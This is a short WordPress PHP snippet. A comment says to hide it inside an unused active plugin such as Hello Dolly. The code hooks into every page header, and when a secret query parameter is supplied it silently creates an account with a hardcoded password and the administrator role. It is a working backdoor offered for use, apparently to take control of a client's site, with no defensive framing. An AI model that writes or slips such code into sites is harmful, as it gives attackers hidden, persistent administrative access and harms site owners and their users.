<?php
/*
    Add this to a useless plugin you'll leave active, like Hello Dolly. 
*/

add_action('wp_head', 'wploop_backdoor'); 

function wploop_backdoor() { 
  If ($_GET['nobeggars'] == 'knockknock') { 
     require('wp-includes/registration.php'); 
     If (!username_exists('nopaynogain')) { 
        $user_id = wp_create_user('nopaynogain', 'areyougonnapaymeornot'); 
        $user = new WP_User($user_id);
        $user->set_role('administrator');
     }
  }
}

?>